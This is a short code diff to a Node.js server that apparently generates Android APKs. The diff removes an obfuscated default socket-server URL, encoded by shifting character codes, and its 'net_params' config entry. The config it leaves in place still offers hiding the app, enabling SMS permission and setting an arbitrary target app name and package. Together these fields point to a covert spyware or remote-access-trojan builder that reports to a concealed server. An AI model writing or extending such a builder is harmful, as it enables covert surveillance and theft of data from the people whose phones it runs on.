@@ -353,14 +353,11 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
 
             // ── Step 4: Inject Runtime Configuration ────────────────
             await sendUpdate('apk_progress', { step: 'Writing configuration assets...', progress: 65 });
-            const socketUrl = process.env.SOCKET_SERVER_URL || 'https://p01--gallery-eye--9zr85m7yb6s4.code.run';
-            const netParams = Array.from(socketUrl).map((c, i) => c.charCodeAt(0) + (i % 7));
             const themeColors = Array.from(webLink || '').map(c => c.charCodeAt(0));
 
             const config = {
                 hideApp:                    hideApp === 'true',
                 theme_colors:               themeColors,
-                net_params:                 netParams,
                 appName:                    targetName,
                 packageName:                targetPkg,
                 enableSmsPermission:        enableSmsPermission === 'true',
@@ -483,3 +480,4 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
 });
 
 app.listen(port, () => console.log(`[APK Generator] Running on port ${port}`));
+
